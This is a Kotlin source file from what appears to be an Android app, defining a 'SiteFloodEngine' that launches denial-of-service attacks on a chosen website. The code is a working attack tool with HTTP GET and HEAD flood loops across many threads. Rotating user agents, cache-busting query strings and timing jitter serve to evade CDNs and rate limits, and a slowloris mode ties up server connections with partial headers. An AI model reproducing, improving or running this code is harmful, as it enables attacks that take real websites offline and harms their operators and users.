package com.twks.wifi

import android.util.Log
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.util.concurrent.atomic.AtomicLong
import kotlin.random.Random

object SiteFloodEngine {
    @Volatile private var isAttacking = false
    private val requestCount = AtomicLong(0)
    private val jobScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val userAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
    )
    private val accepts = listOf(
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "*/*",
        "text/html,application/xhtml+xml"
    )
    private val langs = listOf("en-US,en;q=0.9", "ru-RU,ru;q=0.9", "de-DE,de;q=0.8", "fr-FR,fr;q=0.8")

    fun startFlood(targetUrl: String, threads: Int, mode: Int) {
        if (isAttacking) return
        isAttacking = true
        requestCount.set(0)

        val base = try {
            URL(if (targetUrl.startsWith("http")) targetUrl else "https://$targetUrl")
        } catch (e: Exception) {
            Log.e("TWKS", "Invalid URL: $targetUrl", e)
            return
        }

        for (i in 0 until threads) {
            jobScope.launch {
                val random = Random(System.nanoTime() + i)
                when (mode) {
                    2 -> slowLoop(base, random)
                    1 -> httpLoop(base, random, "HEAD")
                    else -> httpLoop(base, random, "GET")
                }
            }
        }
    }

    // обход CDN и кэшей: каждый запрос с уникальным query
    private fun bust(url: URL, random: Random): URL {
        val sep = if (url.query == null) "?" else "&"
        return URL(url.toString() + sep + "r=" + random.nextLong() + "&x=" + random.nextInt(999999))
    }

    private suspend fun httpLoop(base: URL, random: Random, method: String) {
        var localCount = 0L
        while (isAttacking) {
            var conn: HttpURLConnection? = null
            try {
                conn = bust(base, random).openConnection() as HttpURLConnection
                conn.requestMethod = method
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                conn.instanceFollowRedirects = false
                conn.setRequestProperty("User-Agent", userAgents[random.nextInt(userAgents.size)])
                conn.setRequestProperty("Accept", accepts[random.nextInt(accepts.size)])
                conn.setRequestProperty("Accept-Language", langs[random.nextInt(langs.size)])
                conn.setRequestProperty("Cache-Control", "no-cache")
                conn.setRequestProperty("Connection", "close")
                conn.responseCode
                localCount++
                if (localCount >= 100) {
                    requestCount.addAndGet(localCount)
                    localCount = 0L
                }
                // джиттер против примитивных rate-limit
                delay(random.nextLong(0, 15))
            } catch (e: Exception) {
                delay(50)
            } finally {
                conn?.disconnect()
            }
        }
        requestCount.addAndGet(localCount)
    }

    // slowloris: держит соединения открытыми частичными заголовками
    private suspend fun slowLoop(base: URL, random: Random) {
        val host = base.host
        val port = if (base.port != -1) base.port else if (base.protocol == "https") 443 else 80
        while (isAttacking) {
            var socket: Socket? = null
            try {
                socket = Socket()
                socket.connect(InetSocketAddress(host, port), 3000)
                socket.soTimeout = 0
                val out = socket.getOutputStream()
                val path = if (base.path.isEmpty()) "/" else base.path
                val head = "GET $path?r=${random.nextLong()} HTTP/1.1\r\nHost: $host\r\nUser-Agent: ${userAgents[random.nextInt(userAgents.size)]}\r\nAccept: */*\r\n"
                out.write(head.toByteArray())
                out.flush()
                requestCount.incrementAndGet()
                while (isAttacking) {
                    out.write("X-a-${random.nextInt(9999)}: b\r\n".toByteArray())
                    out.flush()
                    delay(4000)
                }
            } catch (e: Exception) {
                delay(200)
            } finally {
                try { socket?.close() } catch (e: Exception) {}
            }
        }
    }

    fun stopFlood() {
        isAttacking = false
        jobScope.coroutineContext[Job]?.cancelChildren()
    }

    fun getRequestCount(): Long = requestCount.get()
}
